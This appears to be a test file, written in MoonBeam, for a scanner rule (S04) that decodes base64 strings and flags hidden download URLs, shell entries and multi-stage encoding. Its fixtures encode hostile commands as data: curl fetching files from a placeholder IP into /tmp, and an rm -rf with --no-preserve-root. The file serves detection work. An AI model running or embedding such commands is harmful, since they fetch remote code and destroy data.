///|
fn b64_of(s : String) -> String {
  try! @base64.encode(@utf8.encode(s))
}

///|
test "s04_payload flags decoded url payload as critical" {
  // 混淆外传：解码后是下载 URL
  let blob = b64_of(
    "curl http://13.37.13.37/drop/x.sh --silent --output /tmp/x",
  )
  let src = "let s = \"\{blob}\"\n"
  let fs = @source.s04_payload(@source.mkctx_for_test(src))
  inspect(fs.length(), content="1")
  inspect(fs[0].rule, content="S04")
  inspect(fs[0].severity == Critical, content="true")
  inspect(fs[0].message.contains("http url"), content="true")
}

///|
test "s04_payload flags shell entry in decoded payload" {
  let blob = b64_of(
    "#!/bin/sh\nexport HOME=/tmp\nrm -rf /tmp/work --force --no-preserve-root",
  )
  let fs = @source.s04_payload(@source.mkctx_for_test("x = \"\{blob}\""))
  inspect(fs.length(), content="1")
  inspect(fs[0].message.contains("/bin/sh"), content="true")
}

///|
test "s04_payload detects multi-stage base64" {
  // 二级解壳：解码后仍是 base64
  let inner = b64_of(
    "curl http://13.37.13.37/drop/payload-arena --output /tmp/p",
  )
  let outer = b64_of(inner)
  let fs = @source.s04_payload(@source.mkctx_for_test("blob = \"\{outer}\""))
  inspect(fs.length(), content="1")
  inspect(fs[0].message.contains("multi-stage"), content="true")
}

///|
test "s04_payload ignores benign encoded data" {
  // 普通文本（如证书指纹、长标识符）解码后无危险标记
  let blob = b64_of("domain-component=example, organizational-unit=platform")
  let fs = @source.s04_payload(@source.mkctx_for_test("s = \"\{blob}\""))
  inspect(fs.length(), content="0")
}

///|
test "extract_runs finds qualifying runs only" {
  // aaaa...(12) 满足 ≥8；中间断开；末尾短游程不满足
  let src = "aaaaaaaaaaaa!bbbbb!aaaaaa"
  let runs = @source.extract_runs_for_test(src, 8)
  inspect(runs.length(), content="1")
  inspect(runs[0].0, content="0")
  inspect(runs[0].1, content="12")
}
